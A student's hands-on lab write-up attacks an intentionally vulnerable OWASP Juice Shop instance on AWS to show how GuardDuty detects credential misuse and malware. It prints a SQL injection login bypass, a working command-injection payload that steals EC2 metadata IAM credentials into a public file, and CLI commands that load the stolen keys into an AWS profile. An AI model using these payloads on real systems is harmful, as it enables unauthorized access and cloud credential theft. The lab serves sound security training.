<img src="https://cdn.prod.website-files.com/677c400686e724409a5a7409/6790ad949cf622dc8dcd9fe4_nextwork-logo-leather.svg" alt="NextWork" width="300" />

# Threat Detection with GuardDuty

**Project Link:** [View Project](http://learn.nextwork.org/projects/aws-security-guardduty)

**Author:** Duc Thai  
**Email:** ducthai060501@gmail.com

---

<img src="http://learn.nextwork.org/relaxed_teal_timid_avocado/uploads/aws-security-guardduty_v1w2x3y4" alt="Image" style="max-width: 100%; height: auto; display: block; margin: 0 auto;" />

---

## Introducing Today's Project!

### Tools and concepts

The services I used were AWS EC2, S3, CloudShell, and GuardDuty. Key concepts I learnt include SQL injection and command injection attacks, how stolen credentials can be abused, the importance of input sanitization, and the dangers of insecure cloud storage. I also discovered how GuardDuty detects suspicious activity and malware in real time 🦸‍♂️, and how enabling features like S3 Malware Protection adds another layer of defense. Overall, this project was a hands-on lesson in cloud security, attack detection, and how to think like both a hacker and a defender!

### Project reflection

This project took me approximately 3 hours. The most challenging part was getting all resources in CloudFormation successfully deployed—I’m in eu-north-1, where t2.micro instances aren’t supported, so I was stuck there for a while before I figured out the issue and changed the instance type. It was most rewarding to see my attacks detected by GuardDuty and know my cloud security skills had levelled up! Debugging region quirks gave me a real taste of deploying in the wild.

I did this project today because I wanted hands-on experience with cloud security, attack detection, and AWS GuardDuty. My goal was to learn how real-world attacks—like SQL injection, command injection, and credential theft—can happen, and how cloud services help defend against them. This project absolutely met my goals: I got to play both hacker and defender, saw GuardDuty in action, and leveled up my cloud security skills. Plus, it was fun to break things (safely) and then see how AWS keeps us protected!

---

## Project Setup

To set up for this project, I deployed a CloudFormation template that launches a copy of the OWASP Juice Shop application—an open-source, intentionally vulnerable web app designed for security training.

The three main components are:

An EC2 instance that hosts and runs the Juice Shop application, processes user requests, and serves web content.

Networking resources including a new VPC, subnets, and security groups. Instead of using the default VPC, the template follows best practices by creating an isolated network environment for the app.

A CloudFront distribution that speeds up content delivery and provides a public URL for accessing the app.

Additionally, the template deploys an S3 bucket simulating sensitive data accessed by the EC2 instance, and enables GuardDuty for continuous threat detection and security monitoring.

The web app deployed is called OWASP juice shop, which has many security flaws. To practice my GuardDuty skills, I will try to  start to hack my web app and and analyze whether GuardDuty  picked up on my attacks.

GuardDuty is an AWS threat detection service that continuously monitors your AWS environment for malicious or unauthorized activity. It uses machine learning, anomaly detection, and integrated threat intelligence to analyze data from sources like VPC Flow Logs, CloudTrail events, and DNS logs.

If GuardDuty detects suspicious behavior—such as unusual API calls, unauthorized access attempts, or data exfiltration—it automatically generates security findings for investigation.

In this project, it will monitor the deployed web app, detect potential attacks or credential theft, and help me understand how AWS identifies and responds to real-world security threats.

<img src="http://learn.nextwork.org/relaxed_teal_timid_avocado/uploads/aws-security-guardduty_n1o2p3q4" alt="Image" style="max-width: 100%; height: auto; display: block; margin: 0 auto;" />

---

## SQL Injection

The first attack I performed on the web app is SQL injection, which means injecting malicious SQL into backend queries to change their behavior. SQL injection is a security risk because it can bypass authentication, exfiltrate/modify/delete data, and even execute administrative actions on the database.

My SQL injection attack involved entering a crafted input (' OR 1=1--) into the login page of the OWASP Juice Shop. This means I manipulated the SQL query that checks user credentials by injecting code that always evaluates to true. As a result, the application skipped authentication and granted access without a valid password. This works because the user input is directly inserted into the SQL statement without proper validation or parameterization, allowing attackers to alter the query logic and potentially access or modify sensitive data.

<img src="http://learn.nextwork.org/relaxed_teal_timid_avocado/uploads/aws-security-guardduty_h1i2j3k4" alt="Image" style="max-width: 100%; height: auto; display: block; margin: 0 auto;" />

---

## Command Injection

Next, I used command injection, which is a sneaky security vulnerability where the web server treats your input as commands and runs them—like giving a toddler access to the kitchen knives! The Juice Shop web app is vulnerable to this because it expected a simple username, but I sent a script designed to steal the EC2 instance’s IAM keys instead.

This flaw lets attackers access secret data, mess with services, or even take over the whole server. The app fails to check or sanitize user input before using it in system commands—so it basically hands you the keys to the server.

Sanitization (like a bouncer at a club) blocks dodgy commands, but our web app forgot to hire one. That’s why my malicious code waltzed right in and did whatever it wanted!

To run command injection, I strutted over to the admin account page and dropped this spicy script into the username field:

#{global.process.mainModule.require('child_process').exec('CREDURL=http://169.254.169.254/latest/meta-data/iam/security-credentials/;TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s $CREDURL | echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN") && echo $CRED | json_pp >frontend/dist/frontend/assets/public/credentials.json')}

The script will sweet-talk the server into running a series of commands: grabbing the AWS IAM credentials from the EC2 metadata service, and then helpfully saving them in a public file for all to admire. Basically, I turned a username box into a backstage pass! This shows why input validation is crucial—without it, attackers can turn your app into their personal playground.

<img src="http://learn.nextwork.org/relaxed_teal_timid_avocado/uploads/aws-security-guardduty_t3u4v5w6" alt="Image" style="max-width: 100%; height: auto; display: block; margin: 0 auto;" />

---

## Attack Verification

To verify the attack's success, I strutted over to [JuiceShopURL]/assets/public/credentials.json and voilà—the page served up the juicy credentials file my injected script created! The credentials page showed me the AWS access keys, secret keys, and session token used by the web app to access cloud resources in my account. 

Inside the JSON, you’ll find AccessKeyId and SecretAccessKey (the VIP passes to AWS), Token (your session’s backstage wristband), Expiration (when the party ends), and Code/Type (status and credential type). Seeing these details meant my attack worked perfectly: I turned a simple web form into a cloud key vending machine. Always sanitize your inputs, or your secrets might end up on the guest list!

<img src="http://learn.nextwork.org/relaxed_teal_timid_avocado/uploads/aws-security-guardduty_x7y8z9a0" alt="Image" style="max-width: 100%; height: auto; display: block; margin: 0 auto;" />

---

## Using CloudShell for Advanced Attacks

The attack continues in CloudShell, because CloudShell gives me a fresh, temporary AWS environment with its own account ID—like getting a rental car for hacking, not my personal ride! 🚗 AWS does this for security, so every command I run is logged and tracked separately. By using CloudShell and the stolen credentials, I can access resources in the victim’s AWS account while AWS GuardDuty (the cloud’s security guard 🕵️‍♂️) watches for suspicious activity. This setup means any commands I run with those stolen keys can trigger alerts, showing how attacks from CloudShell can be detected and traced. CloudShell is perfect for testing what an attacker could do—safely, and with all eyes on me!

In CloudShell, I used wget to 📥 download the credentials.json file from our Juice Shop web app into my CloudShell environment—now I have the stolen credentials right at my fingertips! Next, I ran a command using cat and jq to show off what's inside: cat displays the file’s contents, while jq prettifies and organizes the JSON data so it’s easy to read (no squinting required).

This combo lets me quickly view and analyze the secret AWS keys I snagged. It’s like turning a messy pile of secrets into a neat, hacker-friendly spreadsheet! Always remember: a tidy credential is a dangerous credential in the wrong hands.

I then set up a profile, called profile.stolen 🕵️‍♂️, to use the stolen credentials we extracted from our daring web app attack. With these commands:

aws configure set profile.stolen.region eu-north-1
aws configure set profile.stolen.aws_access_key_id cat credentials.json | jq -r '.AccessKeyId'
aws configure set profile.stolen.aws_secret_access_key cat credentials.json | jq -r '.SecretAccessKey'
aws configure set profile.stolen.aws_session_token cat credentials.json | jq -r '.Token'

I had to create a new profile because each AWS profile stores unique authentication info—access key, secret key, session token, and region—allowing you to juggle multiple accounts or permissions from the same environment. This lets us slip into our AWS environment disguised as the app, letting us run commands with stolen keys. Now, let’s see if GuardDuty catches our sneaky moves or lets us party in the cloud! 🎉

<img src="http://learn.nextwork.org/relaxed_teal_timid_avocado/uploads/aws-security-guardduty_j9k0l1m2" alt="Image" style="max-width: 100%; height: auto; display: block; margin: 0 auto;" />

---

## GuardDuty's Findings

After performing the attack, GuardDuty reported a
After performing the attack, GuardDuty reported a finding within 5 minutes—blink and you might miss it! ⚡️ Findings are pretty detailed: GuardDuty flagged that credentials for the EC2 instance role NextWork-GuardDuty-project-Dukem-TheRole-rKoK7V4EcZ2A were used from a remote AWS account (096530338542), which is a big red flag. Severity was marked as high, with timestamps showing when the suspicious activity was first and last seen. This quick detection is proof that GuardDuty is watching closely for stolen keys and unusual cross-account access—so attackers don’t get to party for long!

GuardDuty's finding was called "Anomalous Behavior: AWS Credentials Used from Unusual Location" 🚨, which means GuardDuty's smart algorithms spotted someone (me, the hacker!) using your EC2 instance’s credentials in a way that didn’t match normal patterns. GuardDuty compares each activity with your instance’s typical behavior, and when something fishy pops up—like credentials being used from a remote account—it sounds the alarm. Anomaly detection was used because it helps catch sneaky attacks that don’t fit the usual mold, even if the credentials themselves look legit. It’s like having a cloud security dog that barks when something weird happens! 🐕

GuardDuty's detailed finding reported all the juicy details about the unauthorized access, including:  

🔒 Resource affected—pointing out the IAM role used to swipe data from your Juice Shop's S3 bucket.  
📄 Action—showing that an object (yup, that important information text file!) was retrieved by someone who shouldn’t have it.  
🌍 Location and IP address—pinning the attacker’s whereabouts to my AWS Region during the CloudShell session.  

GuardDuty even timestamps when the mischief happened, helping you trace the exact moment your bucket was raided. It’s like getting a full crime scene report, making it clear how, when, and by whom your cloud secrets were accessed!

<img src="http://learn.nextwork.org/relaxed_teal_timid_avocado/uploads/aws-security-guardduty_v1w2x3y4" alt="Image" style="max-width: 100%; height: auto; display: block; margin: 0 auto;" />

---

## Extra: Malware Protection

For my project extension, I enabled Malware Protection for S3 🦠. Malware is any sneaky software designed to harm, steal, or mess with computers and data. By turning on Malware Protection, my S3 buckets now automatically scan uploaded files for viruses, ransomware, and other nasty surprises. This keeps our cloud storage safe, prevents attackers from dropping malicious payloads, and helps keep your data out of the danger zone! It’s like giving your cloud a superhero shield so only safe files get through.

To test Malware Protection, I uploaded an EICAR test file 🦠 into my protected S3 bucket. The uploaded file won't actually cause damage because it’s a harmless, fake virus—like a rubber snake for scaring security systems! The EICAR file is designed to trigger antivirus and malware protection tools without any real threat. In our case, it helps verify that GuardDuty’s malware protection can detect and respond to suspicious uploads. This way, we know our cloud defenses are awake and ready for anything—even if it’s just a test!



Once I uploaded the file, GuardDuty instantly triggered an alert: Object:S3/MaliciousFile 🦠. This verified that GuardDuty’s malware protection is working like a champ—catching suspicious files as soon as they land in your S3 bucket. The detection was fast and accurate, proving that enabling malware protection helps keep your cloud environment safe from nasty surprises. It’s like having a superhero on standby, ready to block any digital villain that tries to sneak in! 🛡️

<img src="http://learn.nextwork.org/relaxed_teal_timid_avocado/uploads/aws-security-guardduty_sm42x3y4" alt="Image" style="max-width: 100%; height: auto; display: block; margin: 0 auto;" />

---
